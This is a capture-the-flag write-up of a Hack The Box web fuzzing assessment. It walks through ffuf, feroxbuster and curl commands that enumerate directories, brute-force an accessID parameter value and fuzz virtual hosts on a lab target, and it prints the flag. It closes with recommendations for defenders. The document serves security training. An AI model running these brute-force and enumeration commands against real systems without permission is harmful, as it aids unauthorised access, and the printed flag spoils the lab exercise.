# HTB WEB FUZZING Skill Assessment

**Author:** cheat setha 
**Target:** `94.237.57.115:49490` (fuzzing_fun.htb vhost discovered)  
**Objective:** Demonstrate directory, parameter, value, and virtual-host fuzzing using common web-discovery tools to locate hidden content and capture the target flag.

---

## Executive summary

This assessment applied standard discovery and fuzzing techniques (`ffuf`, `feroxbuster`, `curl`) against a target web service. Using wordlists from SecLists (`common.txt`) we discovered an admin endpoint, enumerated parameters, identified a working parameter value (`accessID=getaccess`), added a discovered vhost to `/etc/hosts`, performed virtual-host fuzzing, followed hints to a deeper path (`/godeep`) and located the flag:

```
HTB{w3b_fuzz1ng_sk1lls}
```

---

## Tools & resources

- `ffuf` — fast web fuzzer (directory, vhost, parameter/value fuzzing)
    
- `feroxbuster` — recursive directory discovery
    
- `curl` — HTTP requests / manual verification
    
- Wordlist: `/usr/share/seclists/Discovery/Web-Content/common.txt` (SecLists)
    

---

## Scope & assumptions

- Testing limited to the provided target and vhosts discovered during enumeration.
    
- All commands shown were run from a Pwnbox/Kali-like environment with SecLists installed.
    
- No destructive or intrusive exploitation was performed — approach was informational/discovery-only.
    

---

## Methodology & steps

### 1. Directory and file fuzzing (initial)

**Goal:** enumerate common files and directories under `/admin`.

**Command used:**

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u http://94.237.57.115:49490/admin/FUZZ \
     -e .php -v -ic -c -mc 200 -t 50
```

**Notable findings:**

- `http://94.237.57.115:49490/admin/index.php` — status 200
    
- `http://94.237.57.115:49490/admin/panel.php` — status 200
    

(Scan aborted with Ctrl-C after useful results were gathered.)

---

### 2. Parameter fuzzing / identification

**Goal:** inspect `panel.php` for parameters and error messages that reveal parameter names.

**Manual check:**

```bash
curl "http://94.237.57.115:49490/admin/panel.php"
```

**Response:**

```
Invalid parameter, please ensure accessID is set correctly
```

The error message explicitly reveals parameter name: **`accessID`**.

Verify with a basic request:

```bash
curl "http://94.237.57.115:49490/admin/panel.php?accessID=1"
```

**Response:**

```
Invalid parameter, please ensure accessID is set correctly
```

So `accessID` is required and expects a particular value.

---

### 3. Value fuzzing

**Goal:** brute-force likely values for `accessID` using `ffuf`.

**Command used:**

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u "http://94.237.57.115:49490/admin/panel.php?accessID=FUZZ" \
     -fc 404 -ic -c -fs 58
```

**Result:**

- Found `accessID=getaccess` with a non-error response.
    

**Manual verification:**

```bash
curl "http://94.237.57.115:49490/admin/panel.php?accessID=getaccess"
```

**Response:**

```
Head on over to the fuzzing_fun.htb vhost for some more fuzzing fun!
```

---

### 4. Virtual host / vhost discovery

**Goal:** follow the hint and enumerate virtual hosts to find additional content.

1. Add the discovered vhost to `/etc/hosts` (example):
    

```
94.237.57.115   fuzzing_fun.htb
```

2. Validate default vhost:
    

```bash
curl http://fuzzing_fun.htb:49490/
```

**Response:**

```
Welcome to fuzzing_fun.htb!
Your next starting point is in the godeep folder - but it might be on this vhost, it might not, who knows...
```

3. Vhost fuzzing with `ffuf` to enumerate subdomains:
    

```bash
ffuf -u http://fuzzing_fun.htb:49490 \
     -H "Host: FUZZ.fuzzing_fun.htb" \
     -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -ic -c -fw 20
```

Found `hidden.fuzzing_fun.htb` (returns "Wrong path, remember to be looking in /godeep").

Verify:

```bash
curl http://hidden.fuzzing_fun.htb:49490/
```

**Response:**

```
Wrong path, remember to be looking in /godeep
```

---

### 5. Deep directory enumeration

**Goal:** enumerate paths under `/godeep` hinted by the vhost response.

**Command used (feroxbuster for recursive discovery):**

```bash
feroxbuster -u http://hidden.fuzzing_fun.htb:49490/godeep \
            -w /usr/share/seclists/Discovery/Web-Content/common.txt \
            -x php
```

**Highlights:**

- Found `/godeep/` → "Keep going..."
    
- Found `/godeep/stoneedge/`
    
- Found `/godeep/stoneedge/bbclone/`
    
- Found `/godeep/stoneedge/bbclone/typo3/`
    

**Manual verification of final path:**

```bash
curl http://hidden.fuzzing_fun.htb:49490/godeep/stoneedge/bbclone/typo3/
```

**Response (the flag):**

```
HTB{w3b_fuzz1ng_sk1lls}
```

---

## Findings & impact

- **Discovery:** Hidden vhost (`hidden.fuzzing_fun.htb`) and deep path `/godeep/stoneedge/bbclone/typo3/` discovered through systematic fuzzing.
    
- **Sensitive content:** The target flag (sensitive proof) was stored in a publicly accessible path and returned in plain text.
    
- **Root cause:** Exposed content likely due to development/test artifacts or insufficient access control on hidden directories and vhosts.
    
- **Impact:** Information disclosure and potential discovery of additional sensitive resources or misconfigurations.
    

---

## Recommendations (for defenders)

1. **Remove or protect test/dev content** — ensure flags, test files, admin panels, and debug pages are not deployed to production.
    
2. **Access control** — implement authentication and authorization for admin endpoints; do not rely on obscurity (hidden vhosts/paths) as an access control mechanism.
    
3. **Error message hygiene** — avoid leaking parameter names or expected values in error responses. Use generic messages for unknown/invalid parameters.
    
4. **Host/Virtual Host configuration** — ensure web server/vhost mappings are restrictive and do not serve unintended content when Host headers are manipulated.
    
5. **Logging & monitoring** — log unexpected Host header values and unusual fuzzing patterns; trigger alerts for automated discovery attempts.
    
6. **Security testing** — incorporate periodic automated scanning (internal) and manual review to remove leftover files and tighten configurations.
    

---

## Lessons learned / best practices

- Start broad: directory fuzzing exposes many common endpoints quickly.
    
- Read error messages carefully — they often leak the exact parameter/field you need.
    
- Combine techniques: directory fuzzing + parameter/value fuzzing + vhost enumeration is highly effective.
    
- Use response size/status filters to help surface meaningful differences while fuzzing.
    
- Always validate interesting results manually (`curl`) — automated fuzzers can produce false positives.
    

---

## Appendix — Selected commands (compact)

**Directory fuzzing:**

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u http://94.237.57.115:49490/admin/FUZZ -e .php -ic -c -mc 200 -t 50
```

**Parameter discovery & manual check:**

```bash
curl "http://94.237.57.115:49490/admin/panel.php"
curl "http://94.237.57.115:49490/admin/panel.php?accessID=getaccess"
```

**Value fuzzing:**

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u "http://94.237.57.115:49490/admin/panel.php?accessID=FUZZ" \
     -fc 404 -ic -c -fs 58
```

**VHost fuzzing:**

```bash
ffuf -u http://fuzzing_fun.htb:49490 \
     -H "Host: FUZZ.fuzzing_fun.htb" \
     -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -ic -c -fw 20
```

**Recursive discovery:**

```bash
feroxbuster -u http://hidden.fuzzing_fun.htb:49490/godeep \
            -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php
```

**Final flag retrieval:**

```bash
curl http://hidden.fuzzing_fun.htb:49490/godeep/stoneedge/bbclone/typo3/
# -> HTB{w3b_fuzz1ng_sk1lls}
```


